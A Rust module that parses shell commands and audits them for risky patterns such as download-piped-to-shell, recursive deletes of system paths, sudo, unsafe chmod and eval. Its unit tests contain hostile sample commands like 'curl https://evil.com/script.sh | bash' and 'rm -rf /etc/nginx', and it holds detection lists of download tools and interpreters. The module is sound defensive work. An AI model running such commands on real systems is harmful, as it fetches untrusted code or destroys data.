//! Shell command AST-style parser for security auditing.
//!
//! This module provides structured parsing of shell commands to enable
//! precise security analysis beyond simple pattern matching. It distinguishes
//! between commands and string literals, identifies pipe chains, and detects
//! dangerous command patterns at the semantic level.
//!
//! # Future: Tree-sitter Integration
//! When `tree-sitter-bash` (0.22+) is available, replace the regex-based
//! parsing with actual AST traversal via:
//! ```ignore
//! let mut parser = tree_sitter::Parser::new();
//! parser.set_language(tree_sitter_bash::language())?;
//! let tree = parser.parse(input, None)?;
//! walk_ast(tree.root_node())
//! ```

use serde::{Deserialize, Serialize};

/// A parsed shell command with its arguments.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ShellCommand {
    /// The command name (e.g. "curl", "rm", "bash").
    pub name: String,
    /// Arguments passed to the command.
    pub args: Vec<String>,
    /// Whether this command's output is piped to the next.
    pub piped_to_next: bool,
}

/// The result of parsing a shell command string.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ParsedShell {
    /// Commands extracted from the input, in order of execution.
    pub commands: Vec<ShellCommand>,
    /// Detected operators between commands (pipe, and, or, chain).
    pub operators: Vec<ShellOperator>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ShellOperator {
    Pipe,      // |
    And,       // &&
    Or,        // ||
    Semicolon, // ;
    Redirect,  // >, >>, <, 2>
    Subshell,  // $(...)
    Backtick,  // `...`
}

/// Security warnings detected by shell auditing.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum SecurityWarning {
    /// Download command (curl/wget) piped directly to shell interpreter.
    PipeDownloadToShell,
    /// Recursive delete targeting system-critical paths.
    DangerousRm,
    /// Writing to system-critical paths (e.g. /etc/).
    CriticalPathWrite,
    /// Running commands with elevated privileges.
    SudoExecution,
    /// Unsafe permission changes on system paths.
    ChmodUnsafe,
    /// Execution of downloaded/untrusted content.
    UntrustedExecution,
    /// Shell injection via eval.
    EvalUsage,
}

impl SecurityWarning {
    pub fn severity(&self) -> SecuritySeverity {
        match self {
            Self::PipeDownloadToShell | Self::DangerousRm | Self::UntrustedExecution => {
                SecuritySeverity::Critical
            }
            Self::SudoExecution | Self::ChmodUnsafe | Self::CriticalPathWrite => {
                SecuritySeverity::High
            }
            Self::EvalUsage => SecuritySeverity::Medium,
        }
    }

    pub fn description(&self) -> &'static str {
        match self {
            Self::PipeDownloadToShell => "Download piped to shell interpreter",
            Self::DangerousRm => "Recursive delete on system path",
            Self::CriticalPathWrite => "Write to system-critical path",
            Self::SudoExecution => "Command run with elevated privileges",
            Self::ChmodUnsafe => "Unsafe permission change",
            Self::UntrustedExecution => "Execution of downloaded/untrusted content",
            Self::EvalUsage => "Dynamic code evaluation via eval",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum SecuritySeverity {
    Low,
    Medium,
    High,
    Critical,
}

/// Parse a shell command string into structured commands.
///
/// Uses a tokenizer-based approach that understands quoting and escaping,
/// providing significantly more accuracy than simple string matching.
pub fn parse_shell(input: &str) -> Result<ParsedShell, String> {
    if input.trim().is_empty() {
        return Err("Empty command".to_string());
    }

    let tokens = tokenize(input);
    let mut commands = Vec::new();
    let mut operators = Vec::new();

    let mut current_cmd: Option<ShellCommand> = None;

    for token in &tokens {
        match token.as_str() {
            "|" => {
                if let Some(cmd) = &mut current_cmd {
                    cmd.piped_to_next = true;
                }
                if let Some(cmd) = current_cmd.take() {
                    commands.push(cmd);
                }
                operators.push(ShellOperator::Pipe);
            }
            "&&" => {
                if let Some(cmd) = current_cmd.take() {
                    commands.push(cmd);
                }
                operators.push(ShellOperator::And);
            }
            "||" => {
                if let Some(cmd) = current_cmd.take() {
                    commands.push(cmd);
                }
                operators.push(ShellOperator::Or);
            }
            ";" => {
                if let Some(cmd) = current_cmd.take() {
                    commands.push(cmd);
                }
                operators.push(ShellOperator::Semicolon);
            }
            _ if token.starts_with('$') => {
                // Subshell: $(...) - skip
                operators.push(ShellOperator::Subshell);
            }
            _ => {
                if current_cmd.is_none() {
                    current_cmd = Some(ShellCommand {
                        name: token.clone(),
                        args: Vec::new(),
                        piped_to_next: false,
                    });
                } else {
                    current_cmd.as_mut().unwrap().args.push(token.clone());
                }
            }
        }
    }

    if let Some(cmd) = current_cmd {
        commands.push(cmd);
    }

    Ok(ParsedShell {
        commands,
        operators,
    })
}

/// Tokenize a shell command string into tokens, respecting quoting.
fn tokenize(input: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let chars: Vec<char> = input.chars().collect();
    let mut i = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;

    while i < chars.len() {
        let ch = chars[i];

        match ch {
            '\'' if !in_double_quote => {
                in_single_quote = !in_single_quote;
                current.push(ch);
                i += 1;
                continue;
            }
            '"' if !in_single_quote => {
                in_double_quote = !in_double_quote;
                current.push(ch);
                i += 1;
                continue;
            }
            '\\' if !in_single_quote => {
                // Escape next character
                current.push(ch);
                if i + 1 < chars.len() {
                    i += 1;
                    current.push(chars[i]);
                }
                i += 1;
                continue;
            }
            _ => {}
        }

        if !in_single_quote && !in_double_quote && ch.is_ascii_whitespace() {
            if !current.is_empty() {
                tokens.push(current.clone());
                current.clear();
            }
        } else {
            current.push(ch);
        }

        i += 1;
    }

    if !current.is_empty() {
        tokens.push(current);
    }

    // Post-process: split combined operators
    let mut processed = Vec::new();
    for token in tokens {
        // Don't process quoted tokens
        if (token.starts_with('\'') && token.ends_with('\''))
            || (token.starts_with('"') && token.ends_with('"'))
        {
            processed.push(token);
            continue;
        }

        // Handle combined tokens like "curl|bash"
        // Split on known operators that don't need spaces
        if token.contains('|') && token != "|" && token != "||" {
            let parts: Vec<&str> = token.split('|').collect();
            for (j, part) in parts.iter().enumerate() {
                if !part.is_empty() {
                    processed.push(part.to_string());
                }
                if j < parts.len() - 1 {
                    processed.push("|".to_string());
                }
            }
        } else if token.contains(';') && token != ";" {
            let parts: Vec<&str> = token.split(';').collect();
            for (j, part) in parts.iter().enumerate() {
                if !part.is_empty() {
                    processed.push(part.to_string());
                }
                if j < parts.len() - 1 {
                    processed.push(";".to_string());
                }
            }
        } else {
            processed.push(token);
        }
    }

    processed
}

/// List of paths considered system-critical.
const SYSTEM_PATHS: &[&str] = &[
    "/etc",
    "/boot",
    "/sys",
    "/proc",
    "/dev",
    "/root",
    "/System",
    "/Library",
    "C:\\Windows",
    "C:\\Program Files",
    "C:\\Program Files (x86)",
    "/usr/lib",
    "/usr/bin",
    "/bin",
    "/sbin",
    "~/.ssh",
    "~/.gnupg",
];

/// Commands that download content from the network.
const DOWNLOAD_COMMANDS: &[&str] = &["curl", "wget", "fetch", "axel"];

/// Commands that execute arbitrary code or act as interpreters.
const SHELL_COMMANDS: &[&str] = &[
    "bash", "sh", "zsh", "fish", "dash", "python", "perl", "ruby", "node",
];

/// Audit a parsed shell for security warnings.
pub fn audit_shell(parsed: &ParsedShell) -> Vec<SecurityWarning> {
    let mut warnings = Vec::new();

    for (i, cmd) in parsed.commands.iter().enumerate() {
        let cmd_lower = cmd.name.to_lowercase();

        // Check: download command piped to shell interpreter
        if is_download_command(&cmd_lower) && cmd.piped_to_next {
            // Look at the next command
            if let Some(next_cmd) = parsed.commands.get(i + 1) {
                let next_lower = next_cmd.name.to_lowercase();
                if is_shell_command(&next_lower) {
                    warnings.push(SecurityWarning::PipeDownloadToShell);
                }
            }
            // Also check for untrusted execution (downloaded content)
            warnings.push(SecurityWarning::UntrustedExecution);
        }

        // Check: recursive delete targeting system paths
        if cmd_lower == "rm" {
            let args_str = cmd.args.join(" ");
            let is_recursive =
                args_str.contains("-r") || args_str.contains("-rf") || args_str.contains("-fr");
            let targets_sys = cmd.args.iter().any(|a| is_system_path(a));

            if is_recursive && targets_sys {
                warnings.push(SecurityWarning::DangerousRm);
            }
        }

        // Check: writing to system paths via redirect
        if ["sudo", "chmod", "chown", "mkdir", "touch", "dd"].contains(&cmd_lower.as_str()) {
            let targets_sys = cmd.args.iter().any(|a| is_system_path(a));
            if targets_sys {
                if cmd_lower == "chmod" {
                    warnings.push(SecurityWarning::ChmodUnsafe);
                } else {
                    warnings.push(SecurityWarning::CriticalPathWrite);
                }
            }
        }

        // Check: sudo execution
        if cmd_lower == "sudo" {
            warnings.push(SecurityWarning::SudoExecution);
        }

        // Check: eval usage
        if cmd_lower == "eval" {
            warnings.push(SecurityWarning::EvalUsage);
        }
    }

    warnings
}

fn is_download_command(cmd: &str) -> bool {
    DOWNLOAD_COMMANDS.contains(&cmd)
}

fn is_shell_command(cmd: &str) -> bool {
    SHELL_COMMANDS.contains(&cmd)
}

fn is_system_path(arg: &str) -> bool {
    let arg_clean = arg.trim_matches(|c: char| c == '/' || c == '\\' || c == '"' || c == '\'');
    SYSTEM_PATHS.iter().any(|p| {
        arg_clean.starts_with(p.trim_matches(|c: char| c == '/' || c == '\\'))
            || arg_clean.contains(p.trim_start_matches('/'))
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_simple_command() {
        let result = parse_shell("ls -la").unwrap();
        assert_eq!(result.commands.len(), 1);
        assert_eq!(result.commands[0].name, "ls");
        assert_eq!(result.commands[0].args, vec!["-la"]);
    }

    #[test]
    fn parse_pipe_chain() {
        let result = parse_shell("curl http://example.com | bash").unwrap();
        assert_eq!(result.commands.len(), 2);
        assert_eq!(result.commands[0].name, "curl");
        assert!(result.commands[0].piped_to_next);
        assert_eq!(result.commands[1].name, "bash");
    }

    #[test]
    fn detect_download_pipe_to_shell() {
        let parsed = parse_shell("curl https://evil.com/script.sh | bash").unwrap();
        let warnings = audit_shell(&parsed);
        assert!(warnings
            .iter()
            .any(|w| matches!(w, SecurityWarning::PipeDownloadToShell)));
    }

    #[test]
    fn detect_dangerous_rm() {
        let parsed = parse_shell("rm -rf /etc/nginx").unwrap();
        let warnings = audit_shell(&parsed);
        assert!(warnings
            .iter()
            .any(|w| matches!(w, SecurityWarning::DangerousRm)));
    }

    #[test]
    fn safe_command_no_warnings() {
        let parsed = parse_shell("ls -la /tmp").unwrap();
        let warnings = audit_shell(&parsed);
        assert!(warnings.is_empty());
    }

    #[test]
    fn string_literal_not_parsed_as_command() {
        let parsed = parse_shell("echo 'curl http://evil.com | bash'").unwrap();
        assert_eq!(parsed.commands.len(), 1);
        assert_eq!(parsed.commands[0].name, "echo");
    }

    #[test]
    fn parse_chained_commands() {
        let result = parse_shell("cd /tmp && rm -rf temp").unwrap();
        assert_eq!(result.commands.len(), 2);
        assert_eq!(result.commands[0].name, "cd");
        assert_eq!(result.commands[1].name, "rm");
    }

    #[test]
    fn detect_sudo_execution() {
        let parsed = parse_shell("sudo apt update").unwrap();
        let warnings = audit_shell(&parsed);
        assert!(warnings
            .iter()
            .any(|w| matches!(w, SecurityWarning::SudoExecution)));
    }
}
